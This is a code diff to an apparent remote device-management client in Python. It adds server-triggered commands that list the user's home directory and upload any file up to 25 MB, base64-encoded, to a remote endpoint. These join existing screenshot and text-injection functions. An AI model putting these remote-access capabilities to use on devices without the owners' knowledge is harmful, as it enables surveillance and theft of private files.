@@ -1040,6 +1040,78 @@ def trigger_screenshot_capture():
         report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
 
 
+def list_remote_files(start_path=None):
+    base_path = str(start_path or os.path.expanduser("~") or "C:\\").strip()
+    if not base_path or not os.path.exists(base_path):
+        return []
+    try:
+        entries = []
+        with os.scandir(base_path) as iterator:
+            for entry in iterator:
+                try:
+                    stat = entry.stat(follow_symlinks=False)
+                except OSError:
+                    continue
+                entries.append({
+                    "name": entry.name,
+                    "path": entry.path,
+                    "is_dir": entry.is_dir(follow_symlinks=False),
+                    "size": int(getattr(stat, "st_size", 0) or 0),
+                    "modified_at": int(getattr(stat, "st_mtime", 0) * 1000),
+                })
+        entries.sort(key=lambda item: (0 if item["is_dir"] else 1, str(item["name"]).lower()))
+        return entries
+    except OSError:
+        return []
+
+
+def post_file_listing(device_id, path, entries):
+    payload = json.dumps({
+        "device_id": device_id,
+        "path": path,
+        "entries": entries,
+    }).encode("utf-8")
+    headers = {"Content-Type": "application/json"}
+    api_key = os.getenv("INGEST_API_KEY", "").strip()
+    if api_key:
+        headers["x-api-key"] = api_key
+    request = Request(
+        f"{SITE_URL}/api/devices/file-listing-upload",
+        headers=headers,
+        data=payload,
+        method="POST",
+    )
+    with urlopen(request, timeout=20) as response:
+        if response.status >= 400:
+            raise RuntimeError(f"HTTP {response.status}")
+
+
+def upload_file_download(device_id, file_path, file_name, file_data):
+    if not file_data:
+        raise RuntimeError("The selected file is empty.")
+    payload = json.dumps({
+        "device_id": device_id,
+        "path": file_path,
+        "file_name": file_name,
+        "file_size": len(file_data),
+        "file_base64": base64.b64encode(file_data).decode("utf-8"),
+    }).encode("utf-8")
+    headers = {"Content-Type": "application/json"}
+    api_key = os.getenv("INGEST_API_KEY", "").strip()
+    if api_key:
+        headers["x-api-key"] = api_key
+    request = Request(
+        f"{SITE_URL}/api/devices/file-download-upload",
+        headers=headers,
+        data=payload,
+        method="POST",
+    )
+    with urlopen(request, timeout=30) as response:
+        if response.status >= 400:
+            raise RuntimeError(f"HTTP {response.status}")
+        return json.loads(response.read().decode("utf-8"))
+
+
 def poll_screenshot_request():
     try:
         headers = {"Content-Type": "application/json"}
@@ -1142,6 +1214,21 @@ def handle_device_command(command, command_id=None, message=""):
             if not str(message).strip():
                 raise RuntimeError("Autofill text cannot be empty")
             autofill_text(str(message))
+        elif command == "list_files":
+            root_path = str(message).strip() or os.path.expanduser("~")
+            entries = list_remote_files(root_path)
+            post_file_listing(device_id, root_path, entries)
+        elif command == "download_file":
+            file_path = str(message).strip()
+            if not file_path:
+                raise RuntimeError("File path is required for the transfer request.")
+            if not os.path.isfile(file_path):
+                raise RuntimeError(f"File not found: {file_path}")
+            with open(file_path, "rb") as handle:
+                file_bytes = handle.read()
+            if len(file_bytes) > 25 * 1024 * 1024:
+                raise RuntimeError("File transfer is limited to 25 MB to keep the network usage light.")
+            upload_file_download(device_id, file_path, os.path.basename(file_path), file_bytes)
         elif command == "update_client":
             if os.name != "nt":
                 raise RuntimeError("Client updates are only supported on Windows")
